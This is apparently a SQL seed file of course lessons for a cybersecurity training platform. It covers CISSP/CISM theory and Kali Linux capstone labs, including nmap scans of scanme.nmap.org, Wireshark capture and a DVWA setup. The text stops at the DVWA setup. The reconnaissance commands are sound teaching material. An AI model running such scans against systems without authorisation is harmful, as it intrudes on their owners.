Operates at Layer 4–5. Provides encryption for web traffic (HTTPS), email (SMTPS, IMAPS), and other protocols. TLS 1.3 is the current standard — removed weak cipher suites, reduced handshake to one round trip.

### SSH (Secure Shell)

Encrypted remote access (port 22). Replaces Telnet (plaintext). Supports password and public key authentication.

## Common Network Attacks

| Attack | Description | Mitigation |
|--------|-------------|-----------|
| **DDoS** | Overwhelm target with traffic | DDoS protection services, rate limiting, geo-blocking |
| **ARP spoofing** | Poison ARP cache to redirect traffic | Dynamic ARP Inspection (DAI), static ARP entries |
| **DNS poisoning** | Insert fake DNS records | DNSSEC, DNS monitoring |
| **MITM (on-path)** | Intercept communications | Encryption (TLS/IPSec), certificate pinning |
| **VLAN hopping** | Escape one VLAN to access another | Disable DTP, prune unused VLANs on trunks |
| **Session hijacking** | Steal or predict session tokens | Secure session management, TLS, token rotation |

## Software-Defined Networking (SDN)

SDN separates the **control plane** (routing decisions) from the **data plane** (packet forwarding). A centralised SDN controller programmes network devices via APIs.

Security implications:
- **Benefit:** Rapid, automated policy deployment; micro-segmentation; network-wide visibility.
- **Risk:** The controller is a single point of failure and a high-value target. Controller compromise = network compromise.

## Key Takeaways

- Network security uses defence in depth: perimeter, DMZ, internal segmentation, micro-segmentation.
- IPSec tunnel mode for VPNs; ESP provides encryption; TLS 1.3 is the web standard.
- Know the common attacks (DDoS, ARP spoofing, DNS poisoning, MITM) and their mitigations.
- SDN centralises network control — benefits automation but introduces single-point-of-failure risk.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000064', 'Software Development Security',
 'SDLC, secure coding, OWASP, API security, and DevSecOps for CISSP Domain 8.',
$md$
# Software Development Security

## Objectives

By the end of this lesson you will be able to:

- Describe secure SDLC and where security activities fit in each phase.
- Explain the OWASP Top 10 at a management level.
- Describe application security testing methods (SAST, DAST, IAST, SCA).
- Explain API security and software supply chain security.
- Describe DevSecOps and shift-left security.

## Secure Software Development Lifecycle (SSDLC)

| SDLC Phase | Security Activity |
|-----------|------------------|
| **Requirements** | Security requirements, abuse cases, compliance requirements |
| **Design** | Threat modelling (STRIDE, PASTA), security architecture review |
| **Implementation** | Secure coding standards, code review, SAST |
| **Testing** | DAST, penetration testing, fuzz testing |
| **Deployment** | Configuration hardening, secrets management, SBOM |
| **Maintenance** | Vulnerability management, patching, monitoring |

### Threat Modelling

| Method | Focus |
|--------|-------|
| **STRIDE** | Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege |
| **PASTA** | Process for Attack Simulation and Threat Analysis (7-stage, risk-centric) |
| **Attack trees** | Visual decomposition of attack goals into sub-goals |
| **DREAD** | Damage, Reproducibility, Exploitability, Affected users, Discoverability (risk rating) |

## Application Security Testing

| Method | When | How |
|--------|------|-----|
| **SAST** (Static) | During development | Analyses source code without executing |
| **DAST** (Dynamic) | During testing | Tests running application from outside (like an attacker) |
| **IAST** (Interactive) | During testing | Agent inside the application monitors during testing |
| **SCA** (Software Composition Analysis) | During build | Checks third-party libraries for known vulnerabilities |
| **SBOM** (Software Bill of Materials) | At release | Inventory of all components in the software |

## API Security

APIs are the backbone of modern applications. Security considerations:

- **Authentication** — API keys, OAuth 2.0 tokens, mutual TLS.
- **Authorisation** — enforce least privilege per API endpoint.
- **Rate limiting** — prevent abuse and DDoS.
- **Input validation** — APIs are just as vulnerable to injection as web forms.
- **Logging** — log all API calls for audit and detection.

## DevSecOps and Shift-Left

**Shift-left** means moving security earlier in the development process (left on the timeline). Instead of testing security at the end, integrate it throughout:

- **Pre-commit:** SAST in the IDE, secret scanning.
- **CI pipeline:** Automated SAST, SCA, container scanning on every build.
- **CD pipeline:** DAST against staging environment, configuration compliance checks.
- **Production:** Runtime monitoring, WAF, SIEM integration.

## Key Takeaways

- Security must be integrated into every SDLC phase — not bolted on at the end.
- STRIDE is the most widely used threat modelling framework.
- SAST analyses code; DAST tests the running app; SCA checks dependencies.
- API security requires authentication, authorisation, rate limiting, and input validation.
- DevSecOps automates security testing in CI/CD pipelines (shift-left).
$md$, 35, 2);

-- ========== BH-ADV: Module 5 — Security Assessment, Operations, and Incident Management ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000065', 'Security Assessment and Testing',
 'Penetration testing methodologies, audit types, and security metrics for CISSP Domain 6.',
$md$
# Security Assessment and Testing

## Objectives

By the end of this lesson you will be able to:

- Describe penetration testing methodologies and types.
- Explain security audit types (internal, external, third-party, SOC reports).
- Describe security assessment strategies and their management.
- Define key security metrics and KPIs.

## Penetration Testing

Penetration testing simulates real-world attacks to identify exploitable vulnerabilities.

### Types

| Type | Tester Knowledge | Simulates |
|------|-----------------|-----------|
| **Black box** | No prior knowledge of the target | External attacker |
| **White box** | Full knowledge (source code, network diagrams) | Insider or thorough assessment |
| **Grey box** | Partial knowledge (user credentials, some docs) | Compromised user or contractor |

### Methodology (PTES Framework)

1. Pre-engagement — scope, rules of engagement, legal authorisation.
2. Intelligence gathering — reconnaissance.
3. Threat modelling — identify targets and attack vectors.
4. Vulnerability analysis — identify weaknesses.
5. Exploitation — attempt to exploit vulnerabilities.
6. Post-exploitation — determine what an attacker could achieve.
7. Reporting — findings, evidence, risk ratings, and recommendations.

### Rules of Engagement

The ROE document specifies: what is in scope and out of scope, testing hours, prohibited techniques (e.g. no social engineering, no DDoS), emergency contacts, and data handling requirements.

## Security Audits

| Audit Type | Conducted By | Purpose |
|-----------|-------------|---------|
| **Internal audit** | Organisation's own audit team | Assess control effectiveness |
| **External audit** | Independent third-party auditor | Regulatory compliance, certification |
| **SOC 1 (Type I/II)** | Independent auditor | Financial reporting controls |
| **SOC 2 (Type I/II)** | Independent auditor | Trust Service Criteria (security, availability, processing integrity, confidentiality, privacy) |
| **SOC 3** | Independent auditor | Public-facing summary of SOC 2 |

Type I = design and existence of controls at a point in time.
Type II = design and **operating effectiveness** over a period (usually 6–12 months). Type II is more rigorous and more valued.

## Security Metrics

| Metric | Description |
|--------|-------------|
| **MTTD** (Mean Time to Detect) | Average time from compromise to detection |
| **MTTR** (Mean Time to Respond) | Average time from detection to containment |
| **Dwell time** | Total time attacker is in the environment (MTTD + MTTR) |
| **False positive rate** | Percentage of alerts that are not real threats |
| **Patch compliance** | Percentage of systems with current patches |
| **Vulnerability age** | Average time vulnerabilities remain open |

## Key Takeaways

- Penetration testing types: black box (no info), white box (full info), grey box (partial).
- Rules of engagement define scope, methods, and boundaries before testing begins.
- SOC 2 Type II is the gold standard for third-party assurance.
- Track MTTD, MTTR, and dwell time as key security effectiveness metrics.
$md$, 30, 1),

('b0000000-0000-4000-8000-000000000065', 'Security Operations Management',
 'Investigations, evidence handling, DR, change management, and resource protection at CISSP level.',
$md$
# Security Operations Management

## Objectives

By the end of this lesson you will be able to:

- Describe investigation types and evidence handling requirements.
- Explain disaster recovery planning, testing, and site types.
- Describe change and configuration management at enterprise scale.
- Explain resource protection and media management.

## Investigations

| Investigation Type | Standard of Proof | Led By |
|-------------------|------------------|--------|
| **Administrative** | Preponderance of evidence | HR/management |
| **Civil** | Preponderance of evidence | Legal |
| **Criminal** | Beyond reasonable doubt | Law enforcement |
| **Regulatory** | Varies by regulation | Regulatory body |

### Evidence Handling

- **Chain of custody** — documents who handled evidence, when, and what they did. Any break in the chain may render evidence inadmissible.
- **Order of volatility** — collect most volatile evidence first: CPU registers → cache → RAM → disk → remote logs → backups.
- **Legal hold** — preserve all potentially relevant data when litigation is anticipated.

## Disaster Recovery

### Recovery Metrics

| Metric | Definition |
|--------|-----------|
| **RPO** (Recovery Point Objective) | Maximum acceptable data loss (e.g. 4 hours = last backup must be ≤ 4 hours old) |
| **RTO** (Recovery Time Objective) | Maximum acceptable downtime (e.g. 2 hours = must be operational within 2 hours) |
| **MTBF** (Mean Time Between Failures) | Average time between system failures |
| **MTTR** (Mean Time to Repair) | Average time to restore after failure |

### Recovery Sites

| Type | Cost | RTO | Description |
|------|------|-----|-------------|
| **Hot site** | Highest | Minutes to hours | Fully equipped, data replicated, ready to operate |
| **Warm site** | Medium | Hours to days | Equipment in place, needs data and configuration |
| **Cold site** | Lowest | Days to weeks | Empty facility with power and connectivity |
| **Cloud-based** | Variable | Minutes to hours | IaaS/DRaaS; spin up infrastructure on demand |

### DR Testing

| Test Type | Description | Disruption |
|-----------|-------------|-----------|
| **Tabletop** | Discussion-based walkthrough of a scenario | None |
| **Simulation** | Enact the scenario without affecting production | Minimal |
| **Parallel** | Activate DR site while primary remains running | Minimal |
| **Full interruption** | Shut down primary and operate from DR site | Significant |

## Change and Configuration Management

**Change management** ensures all modifications to production systems are controlled:
1. Request → 2. Risk assessment → 3. CAB review → 4. Approval → 5. Implementation → 6. Verification → 7. Documentation.

**Configuration management** maintains a known, documented baseline:
- **Configuration items (CIs)** — tracked in a CMDB (Configuration Management Database).
- **Baseline** — the approved configuration state.
- **Drift detection** — automated scanning for deviations from baseline.

## Key Takeaways

- Investigations: criminal requires "beyond reasonable doubt"; chain of custody must be unbroken.
- RPO = acceptable data loss; RTO = acceptable downtime. Hot site = fastest recovery.
- DR tests range from tabletop (no disruption) to full interruption (maximum realism).
- Change management controls modifications; configuration management maintains baselines.
$md$, 35, 2),

('b0000000-0000-4000-8000-000000000065', 'Incident Management from a Leadership Perspective',
 'IR planning, communication, regulatory notification, and post-incident review for CISM.',
$md$
# Incident Management from a Leadership Perspective

## Objectives

By the end of this lesson you will be able to:

- Design an incident response plan from a management perspective.
- Describe communication plans for incidents (internal, external, regulatory, media).
- Explain regulatory notification requirements.
- Conduct effective post-incident reviews.

## IR Planning at the Management Level

As a security leader, your IR plan must address not just technical response but organisational readiness:

### IR Plan Components

| Component | Description |
|-----------|-------------|
| **Governance** | IR policy approved by the board; roles and authority defined |
| **Roles and responsibilities** | IR manager, technical lead, communications lead, legal, HR, executive sponsor |
| **Classification** | Severity levels (P1–P4) with escalation criteria and SLAs |
| **Communication plan** | Who is notified, when, how, and by whom |
| **Third-party coordination** | Retainer with IR firm, law enforcement contacts, cyber insurance carrier |
| **Training and exercises** | Annual tabletop exercises involving executives and board members |
| **Budget** | IR retainer, tools, training, insurance |

## Communication During Incidents

| Audience | When | Who Communicates | Key Message |
|----------|------|-----------------|-------------|
| **IR team** | Immediately | IR manager | Technical details, assignments |
| **Executive leadership** | Within 1 hour (P1) | CISO | Business impact, actions being taken |
| **Board of directors** | Within 24 hours (significant incidents) | CISO/CEO | Scope, impact, regulatory exposure |
| **Employees** | When needed | Communications/HR | What happened, what to do (e.g. change passwords) |
| **Customers** | As required by law/contract | Communications/Legal | What happened, what data was affected, what you are doing |
| **Regulators** | Per regulatory timeline | Legal/DPO | Formal notification with required details |
| **Media** | If public exposure is likely | PR/Communications | Prepared statement, consistent messaging |

## Regulatory Notification

| Regulation | Notification Deadline | Requirement |
|-----------|----------------------|-------------|
| **GDPR** | 72 hours | Notify supervisory authority; notify individuals if high risk |
| **HIPAA** | 60 days | Notify HHS, affected individuals, and media (if > 500 individuals) |
| **PCI DSS** | "Immediately" | Notify acquiring bank and card brands |
| **NIS2** (EU) | 24 hours initial, 72 hours full | Notify national CSIRT |

## Post-Incident Review (Lessons Learned)

Conduct within 1–2 weeks of incident closure. Purpose: improve, not blame.

### Review Structure

1. **Timeline** — what happened, when, in what order.
2. **What went well** — identify effective actions.
3. **What needs improvement** — identify gaps (detection, response, communication).
4. **Root cause** — why did this happen? (technical cause and process/people cause).
5. **Action items** — specific, assigned, with deadlines.
6. **Metrics** — MTTD, MTTR, scope, impact quantification.

### Reporting to the Board

Translate technical details into business language:
- **What happened** — one sentence, no jargon.
- **Business impact** — financial, operational, reputational, regulatory.
- **Root cause** — why, at a process/policy level.
- **What we are doing** — actions taken and planned.
- **Investment needed** — budget request with ROI framing.

## Key Takeaways

- IR planning at the leadership level covers governance, roles, communication, third parties, and budget.
- Communication plans must address all audiences: internal team, executives, board, regulators, customers, media.
- Know the major regulatory notification deadlines: GDPR 72h, HIPAA 60d, NIS2 24h.
- Post-incident reviews improve the programme — focus on root cause and action items, not blame.
$md$, 30, 3);

-- ========== BH-ADV: Module 6 — Information Security Programme and Governance ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000066', 'Information Security Programme Management',
 'Programme resources, budgeting, maturity models, metrics, and stakeholder management for CISM.',
$md$
# Information Security Programme Management

## Objectives

By the end of this lesson you will be able to:

- Describe the components of an information security programme.
- Explain programme budgeting and resource allocation.
- Describe maturity models and how to measure programme maturity.
- Define programme metrics and reporting.

## Programme Components

An information security programme is the overarching structure that organises all security activities:

| Component | Description |
|-----------|-------------|
| **Charter** | Document authorising the programme, signed by executive leadership |
| **Strategy** | 3–5 year roadmap aligned to business objectives |
| **Policies and standards** | Governance documents that define expectations |
| **Architecture** | Security technology stack and integration |
| **Operations** | Day-to-day security activities (SOC, vulnerability management, IAM) |
| **Training and awareness** | Educating all employees and specialised training for security staff |
| **Compliance** | Mapping to regulatory and contractual obligations |
| **Metrics and reporting** | Measuring effectiveness and communicating to stakeholders |

## Budgeting and Resource Allocation

### Budget Categories

| Category | Examples |
|----------|---------|
| **Personnel** | Salaries, contractors, training, certifications (often 60-70% of budget) |
| **Technology** | SIEM, EDR, vulnerability scanner, IAM, DLP, WAF licences |
| **Services** | Penetration testing, IR retainer, managed security services, cyber insurance |
| **Compliance** | Audit fees, certification costs |
| **Projects** | Zero trust migration, SIEM upgrade, DLP deployment |

### Building a Business Case

Frame security spending in business terms:
- **Risk reduction** — "This control reduces the likelihood of a $5M data breach by 60%."
- **Compliance** — "This investment is required to maintain PCI DSS certification."
- **Efficiency** — "Automating this process saves 20 analyst-hours per week."
- **Competitive advantage** — "SOC 2 certification enables us to close enterprise deals."

## Maturity Models

### CMMI (Capability Maturity Model Integration)

| Level | Name | Description |
|-------|------|-------------|
| 1 | **Initial** | Ad hoc, reactive, unpredictable |
| 2 | **Managed** | Basic processes defined and followed for projects |
| 3 | **Defined** | Organisation-wide standards and processes |
| 4 | **Quantitatively Managed** | Measured with metrics; data-driven decisions |
| 5 | **Optimising** | Continuous improvement based on quantitative feedback |

Most organisations start at Level 1–2. Level 3 is a good medium-term target. Level 5 is aspirational.

## Programme Metrics

| Metric | Measures | Target Direction |
|--------|---------|-----------------|
| **Patch compliance rate** | % of systems with current patches | ↑ Higher is better |
| **Vulnerability MTTR** | Average days to remediate by severity | ↓ Lower is better |
| **Security awareness completion** | % of employees who completed training | ↑ Higher is better |
| **Phishing click rate** | % of employees who click simulated phishing | ↓ Lower is better |
| **MTTD / MTTR** | Detection and response speed | ↓ Lower is better |
| **Audit findings** | Number of open audit findings | ↓ Lower is better |
| **Risk register coverage** | % of business units with current risk assessments | ↑ Higher is better |

## Key Takeaways

- A security programme needs a charter, strategy, policies, operations, training, compliance, and metrics.
- Personnel is typically the largest budget item (60-70%).
- Frame security budgets as risk reduction, compliance, or efficiency to gain executive buy-in.
- Use maturity models (CMMI) to measure and communicate programme progress.
$md$, 30, 1),

('b0000000-0000-4000-8000-000000000066', 'Governance Frameworks: COBIT and ISO 27001',
 'COBIT 2019 and ISO 27001 implementation at management level for CISSP and CISM.',
$md$
# Governance Frameworks: COBIT and ISO 27001

## Objectives

By the end of this lesson you will be able to:

- Describe COBIT 2019 and its governance system components.
- Explain ISO 27001 and the ISMS lifecycle.
- Compare COBIT, ISO 27001, and NIST CSF and when to use each.
- Describe ISO 27001 certification and audit process.

## COBIT 2019

COBIT (Control Objectives for Information and Related Technologies) is an IT governance framework developed by ISACA. It aligns IT with business objectives.

### Key Components

| Component | Description |
|-----------|-------------|
| **Governance system principles** | Six principles: provide stakeholder value, holistic approach, dynamic governance system, distinct governance from management, tailored to enterprise needs, end-to-end |
| **Governance and management objectives** | 40 processes organised into 5 domains |
| **Components of the governance system** | Processes, organisational structures, policies, culture, information, services/infrastructure, people/skills |

### COBIT Domains

| Domain | Focus | Example Objectives |
|--------|-------|-------------------|
| **EDM** (Evaluate, Direct, Monitor) | Governance | Ensure governance framework, value delivery, risk optimisation |
| **APO** (Align, Plan, Organise) | Management | Strategy, enterprise architecture, innovation, budgets, HR |
| **BAI** (Build, Acquire, Implement) | Management | Solutions, changes, assets, configuration |
| **DSS** (Deliver, Service, Support) | Management | Operations, service requests, problems, security, controls |
| **MEA** (Monitor, Evaluate, Assess) | Management | Performance, compliance, assurance |

### COBIT vs NIST CSF vs ISO 27001

| Framework | Focus | Best For |
|-----------|-------|----------|
| **COBIT** | IT governance and management | Aligning IT with business; CISO reporting to board |
| **NIST CSF** | Cybersecurity risk management | Organising security programme around Identify/Protect/Detect/Respond/Recover |
| **ISO 27001** | Information security management system | Certification; demonstrating security to customers and regulators |

They are complementary, not competing. Many organisations use ISO 27001 for certification, NIST CSF for security programme structure, and COBIT for IT governance.

## ISO 27001

ISO 27001 is the international standard for Information Security Management Systems (ISMS). It specifies requirements for establishing, implementing, maintaining, and continually improving an ISMS.

### ISMS Lifecycle (Plan-Do-Check-Act)

| Phase | Activities |
|-------|-----------|
| **Plan** | Define scope, risk assessment methodology, risk treatment plan, Statement of Applicability (SoA) |
| **Do** | Implement controls, awareness training, operate the ISMS |
| **Check** | Internal audits, management reviews, monitoring and measurement |
| **Act** | Corrective actions, continual improvement |

### Annex A Controls

ISO 27001 Annex A (aligned with ISO 27002) contains 93 controls in 4 categories:

| Category | Count | Examples |
|----------|-------|---------|
| **Organisational** | 37 | Information security policies, roles, supplier relationships |
| **People** | 8 | Screening, awareness, disciplinary process |
| **Physical** | 14 | Physical entry controls, equipment protection |
| **Technological** | 34 | Access rights, cryptography, logging, network security |

The Statement of Applicability (SoA) lists all 93 controls and states which are applicable, which are implemented, and which are excluded (with justification).

### Certification

1. **Stage 1 audit** — documentation review (ISMS design).
2. **Stage 2 audit** — operational effectiveness (evidence of implementation).
3. **Certificate** — valid for 3 years.
4. **Surveillance audits** — annual check that the ISMS is maintained.
5. **Re-certification** — full audit every 3 years.

## Key Takeaways

- COBIT governs IT alignment with business; ISO 27001 certifies security management; NIST CSF organises cybersecurity.
- COBIT has 40 processes across 5 domains (EDM, APO, BAI, DSS, MEA).
- ISO 27001 uses Plan-Do-Check-Act with 93 Annex A controls.
- ISO 27001 certification requires Stage 1 (design) and Stage 2 (effectiveness) audits.
$md$, 35, 2);

-- ========== STANDALONE CAPSTONE MODULES (updated order_index) ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000071', 'a0000000-0000-4000-8000-000000000001', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
  ('b0000000-0000-4000-8000-000000000072', 'a0000000-0000-4000-8000-000000000002', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 6),
  ('b0000000-0000-4000-8000-000000000073', 'a0000000-0000-4000-8000-000000000003', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
  ('b0000000-0000-4000-8000-000000000074', 'a0000000-0000-4000-8000-000000000004', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 6),
  ('b0000000-0000-4000-8000-000000000075', 'a0000000-0000-4000-8000-000000000005', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
  ('b0000000-0000-4000-8000-000000000076', 'a0000000-0000-4000-8000-000000000006', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
  ('b0000000-0000-4000-8000-000000000077', 'a0000000-0000-4000-8000-000000000007', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 7);

-- ========== CAPSTONE PROJECTS — ONE PER COURSE ==========

-- ========== BH-BRIDGE: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000071', 'Capstone: Your First Linux Lab',
 'Demonstrate essential Linux skills on Kali Linux. Submit screenshots as a PDF.',
$md$
# Capstone: Your First Linux Lab

## Overview

This is the Bridge course capstone project. You will demonstrate that you can navigate a Linux system, manage files, create users, and set permissions — all on Kali Linux.

**Time estimate:** 45–60 minutes
**Prerequisite:** Complete the Kali Linux Setup Guide lesson.
**Deliverable:** A single PDF with screenshots and explanations.

## Tasks

### Task 1 — System Information (10 marks)

Open a terminal on Kali and run the following commands. Take **one screenshot** showing all outputs:

```
uname -a
cat /etc/os-release
whoami
hostname
df -h
```

**What to include:** A screenshot showing the terminal with all five command outputs visible.

### Task 2 — Directory Structure (10 marks)

Create the following directory structure in your home directory:

```
~/capstone-bridge/
├── reports/
├── evidence/
└── tools/
```

Run `tree ~/capstone-bridge` (install with `sudo apt install tree` if needed) and take a screenshot.

**Commands:**
```
mkdir -p ~/capstone-bridge/{reports,evidence,tools}
tree ~/capstone-bridge
```

### Task 3 — File Creation and Editing (10 marks)

Create a text file at `~/capstone-bridge/reports/findings.txt` containing:
- Your full name
- Today's date
- The sentence: "This is my first capstone project on Kali Linux."

**Commands:**
```
echo "Name: [Your Name]" > ~/capstone-bridge/reports/findings.txt
echo "Date: $(date +%Y-%m-%d)" >> ~/capstone-bridge/reports/findings.txt
echo "This is my first capstone project on Kali Linux." >> ~/capstone-bridge/reports/findings.txt
cat ~/capstone-bridge/reports/findings.txt
```

Take a screenshot showing the `cat` output.

### Task 4 — User Management (15 marks)

Create a new user called `testanalyst`, set a password, and verify the user was created:

```
sudo adduser testanalyst
```

Follow the prompts to set a password (you can leave other fields blank).

Then verify:
```
grep testanalyst /etc/passwd
id testanalyst
```

Take a screenshot showing the grep and id outputs.

### Task 5 — File Permissions (15 marks)

Set the permissions on `findings.txt` so that:
- The **owner** can read and write.
- The **group** can read only.
- **Others** have no access.

```
chmod 640 ~/capstone-bridge/reports/findings.txt
ls -la ~/capstone-bridge/reports/findings.txt
```

Take a screenshot showing the `ls -la` output. The permissions should show `-rw-r-----`.

### Task 6 — Install and Use a Package (10 marks)

Install the `figlet` package and use it to display your name as ASCII art:

```
sudo apt install -y figlet
figlet [Your Name]
```

Take a screenshot of the ASCII art output.

### Task 7 — Search with grep (10 marks)

Use `grep` to find all user accounts with `/bin/bash` as their shell:

```
grep "/bin/bash" /etc/passwd
```

Take a screenshot of the output. Count how many accounts have bash and write the number in your report.

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. System info | 10 | All 5 commands shown with correct output |
| 2. Directory structure | 10 | tree output matches required structure |
| 3. File creation | 10 | File content correct; cat output shown |
| 4. User management | 15 | User created; passwd and id output shown |
| 5. File permissions | 15 | Permissions are exactly `-rw-r-----` |
| 6. Package install | 10 | figlet installed and name displayed |
| 7. grep search | 10 | Correct grep output with count |
| PDF quality | 20 | Professional layout; clear screenshots; explanations for each task |
| **Total** | **100** | |

## Submission Instructions

1. Compile all screenshots into a single PDF using LibreOffice Writer (see the Kali Setup Guide for instructions).
2. Name your file: **`BH-BRIDGE-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 60, 1);

-- ========== BH-FOUND-1: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000072', 'Capstone: Reconnaissance Report',
 'Conduct network reconnaissance using Kali Linux tools and write a findings report.',
$md$
# Capstone: Reconnaissance Report

## Overview

You will perform passive and active reconnaissance against an authorised target using Kali tools, then compile a professional findings report.

**Time estimate:** 60–90 minutes
**Prerequisite:** Kali Linux Setup Guide completed.
**Deliverable:** PDF with screenshots and a one-page findings summary.

## Authorised Target

You will scan **scanme.nmap.org** — this host is provided by the Nmap Project specifically for scanning practice. You are authorised to scan it with nmap.

> **Legal reminder:** Only scan scanme.nmap.org or your own systems. Do not scan any other target without written permission.

## Tasks

### Task 1 — Service Version Scan (15 marks)

Run a service version detection scan:

```
nmap -sV scanme.nmap.org
```

Take a screenshot of the full output. In your report, list each open port and the service/version detected.

### Task 2 — Script Scan (15 marks)

Run an nmap script scan to gather more detail:

```
nmap -sC scanme.nmap.org
```

Take a screenshot. Identify one interesting piece of information the scripts revealed that the basic scan did not (e.g. SSH host key, HTTP title).

### Task 3 — Operating System Detection (10 marks)

Attempt OS detection:

```
sudo nmap -O scanme.nmap.org
```

Take a screenshot. Note: OS detection requires root (`sudo`) and sends different packet types. Record what OS nmap detected (or if it could not determine).

### Task 4 — DNS Lookup (15 marks)

Perform a DNS lookup for `nmap.org`:

```
dig nmap.org ANY
dig nmap.org MX
dig nmap.org NS
```

Take a screenshot showing all three outputs. In your report, list:
- The A record(s) (IP address)
- The MX record(s) (mail servers)
- The NS record(s) (name servers)

### Task 5 — WHOIS Lookup (15 marks)

Perform a WHOIS lookup:

```
whois nmap.org
```

Take a screenshot showing the key registration details. In your report, record:
- Registrant organisation
- Creation date
- Name servers

### Task 6 — Findings Report (30 marks)

Write a **one-page findings summary** as the last page of your PDF. Structure it as follows:

**Target:** scanme.nmap.org
**Date of scan:** [date]
**Analyst:** [your name]

**Summary of findings:**
- Number of open ports found
- Services and versions running
- Operating system detected
- DNS configuration summary
- Registration details

**Risk observations:**
- Identify one potential security concern based on your findings (e.g. an outdated service version, an open port that is commonly targeted).

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. Service scan | 15 | Correct nmap command; ports/services listed |
| 2. Script scan | 15 | Script output shown; one additional finding identified |
| 3. OS detection | 10 | Command run with sudo; OS noted |
| 4. DNS lookup | 15 | All three dig commands; A, MX, NS recorded |
| 5. WHOIS | 15 | Key details extracted correctly |
| 6. Findings report | 30 | Professional layout; complete summary; risk observation valid |
| **Total** | **100** | |

## Submission

1. Compile into a PDF with all screenshots and the findings report.
2. Name: **`BH-FOUND1-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 90, 1);

-- ========== BH-FOUND-2: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000073', 'Capstone: Network Security Audit',
 'Analyse network traffic and listening services on Kali Linux, then write firewall rules.',
$md$
# Capstone: Network Security Audit

## Overview

You will audit network services on your own Kali VM, capture and analyse traffic, and write firewall rules based on your findings.

**Time estimate:** 60–90 minutes
**Prerequisite:** Kali Linux running in VirtualBox.
**Deliverable:** PDF with screenshots and a written firewall policy.

## Tasks

### Task 1 — Listening Services Audit (15 marks)

List all listening services on your Kali VM:

```
ss -tuln
```

Take a screenshot. In your report, create a table listing each listening port, protocol (TCP/UDP), and what service you believe is running on it. Use `ss -tulnp` (with `sudo`) to confirm process names if needed.

### Task 2 — Live Traffic Capture (20 marks)

Open **Wireshark** (Applications → Sniffing & Spoofing → Wireshark, or type `wireshark` in terminal).

1. Select your network interface (usually `eth0` for VirtualBox).
2. Start capturing.
3. In a separate terminal, generate traffic:
   ```
   curl -s https://www.example.com > /dev/null
   ping -c 4 8.8.8.8
   dig google.com
   ```
4. Stop the capture after the commands complete.

Take screenshots showing:
- The capture with packets visible.
- Apply the display filter `dns` — screenshot the DNS queries.
- Apply the display filter `tcp.port == 443` — screenshot the HTTPS traffic.

### Task 3 — Protocol Hierarchy (15 marks)

In Wireshark, go to **Statistics → Protocol Hierarchy**.

Take a screenshot. In your report, list the top 3 protocols by percentage and explain what each one is used for.

### Task 4 — Analyse a Sample PCAP (20 marks)

Download a sample PCAP from the Wireshark wiki. In your Kali terminal:

```
wget https://wiki.wireshark.org/uploads/27707187aeb30df68e70c8fb9571571/http.cap
wireshark http.cap
```

In your report, answer:
1. How many packets are in the capture?
2. What HTTP request was made (method, URL)?
3. What was the server's response code?
4. What is the server software (check the HTTP headers)?

Take a screenshot showing the HTTP request and response with one packet selected showing the header details.

### Task 5 — Write Firewall Rules (30 marks)

Based on your findings from Tasks 1–4, write a set of firewall rules for a hypothetical web server. Use this format:

| # | Direction | Protocol | Port | Source | Destination | Action | Reason |
|---|-----------|----------|------|--------|-------------|--------|--------|
| 1 | Inbound | TCP | 443 | Any | Server | Allow | HTTPS traffic |
| 2 | ... | ... | ... | ... | ... | ... | ... |

Write at least **6 rules** including:
- Allow necessary traffic (HTTPS, SSH from admin IP only)
- Block common attack ports
- A default deny rule at the end

Explain each rule in the "Reason" column.

---

## Marking Rubric

| Task | Marks | Criteria |
|------|-------|----------|
| 1. Listening services | 15 | ss output shown; services correctly identified |
| 2. Traffic capture | 20 | Capture shown; both display filters applied correctly |
| 3. Protocol hierarchy | 15 | Screenshot shown; top 3 protocols explained |
| 4. Sample PCAP | 20 | All 4 questions answered correctly with screenshot |
| 5. Firewall rules | 30 | At least 6 rules; correct format; valid reasoning; default deny included |
| **Total** | **100** | |

## Submission

1. Compile into PDF.
2. Name: **`BH-FOUND2-capstone-[FirstName]-[LastName].pdf`**
3. Upload using the **Upload Capstone** button below.
$md$, 90, 1);

-- ========== BH-CYBER-2: CAPSTONE ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000074', 'Capstone: Vulnerability Assessment',
 'Scan a deliberately vulnerable target, rate findings, and produce an assessment report.',
$md$
# Capstone: Vulnerability Assessment

## Overview

You will scan a deliberately vulnerable web application (DVWA) running locally on your Kali VM, identify vulnerabilities, rate them using CVSS, and produce a professional vulnerability assessment report.

**Time estimate:** 90–120 minutes
**Prerequisite:** Kali Linux with Docker installed (see Kali Setup Guide).
**Deliverable:** PDF with screenshots and a vulnerability assessment report.

## Setup — Start DVWA

Run DVWA in Docker on your Kali VM:

```
sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
```

Open Firefox in Kali and navigate to `http://localhost`. Log in with **admin / password**. Click **Create / Reset Database** at the bottom, then log in again.

